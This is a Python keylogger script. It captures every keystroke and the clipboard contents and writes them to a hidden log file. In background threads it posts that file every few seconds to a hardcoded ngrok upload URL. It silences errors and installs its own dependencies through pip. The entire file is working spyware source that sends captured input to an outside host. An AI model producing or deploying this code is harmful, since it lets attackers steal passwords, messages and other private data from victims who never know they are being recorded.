#!/usr/bin/python3

# _*_ coding: utf-8 _*_


#tested on Linux (Linux kali 6.5.0-kali2-amd64)

# to do:
# logging keystrokes of virtual keyboard


# New:
# It sends the file to a http server


try:
    from os import system,path
    import threading
    #import socket
    from pynput import keyboard  #type: ignore
    from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
    from datetime import datetime

    # encryption and encoding
    #import rsa
    #from base64 import b64encode
    from time import sleep

    #supports https
    from requests import post
    from requests.exceptions import RequestException
except:
    #two dependencies pynput and pandas ['-q' for quite mode]
    system('pip install -q pynput')
    system('pip install -q pyperclip')


# <-- Initializing global values -->

# change this
SERVER_ADDRESS = 'https://bcd4-103-55-96-137.ngrok-free.app/upload'         # replace the Address
INTERVAL = 5                                                                # set interval according to your requirement



# no change required
duplicate = ['']
FILENAME = f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'  # unix oriented [.19062024132058.log]


#keystroke record
class keylogger:

    # init
    def __init__(self):
        pass


    # saving the file
    def savefile(self,data):
        try:
            with open(FILENAME,'a+') as fh:
                #encrypted_data = b64encode(rsa.encrypt(data.encode(), self.publickey))   # encrypting and storing
                #fh.write(str(encrypted_data))
                fh.write(str(data))
        except:
            pass
    

    def Keylogging(self):
        def on_key_press(key):
            try:
                # to get the clipboard data
                data = paste()

                if data != duplicate[0]:
                    self.savefile(f'Clipboard data: {data}\n')
                    duplicate[0] = data

                # logging the keystrokes
                self.savefile(f'{str(key)}\n')

            except:
                pass


        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


    # destructor
    def __del__(self):
        pass


# send the file to the http server at regular interval
class uploader:
    
    # init
    def __init__(self):
        pass
    
    def upload_file_periodically(self):
        
        sleep(INTERVAL)
        
        while True:
            try:
                if path.exists(FILENAME):
                    with open(FILENAME, 'rb') as fh:
                        files = {'file': fh}

                        post(SERVER_ADDRESS, files=files)   # sending the file

                else:
                    pass  # file not created/found

                sleep(INTERVAL)

            except:
                pass

    def __del__(self):
        pass




if __name__=='__main__':
    try:
        # creating objects
        keylogger  = keylogger()
        uploader = uploader()

        # <---  implementing threading  ---> 
       
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        uploader_thread = threading.Thread(target = uploader.upload_file_periodically, daemon = True)
        uploader_thread.start()


        keylogger_thread.join()
        uploader_thread.join()   
    
    except KeyboardInterrupt:
        pass

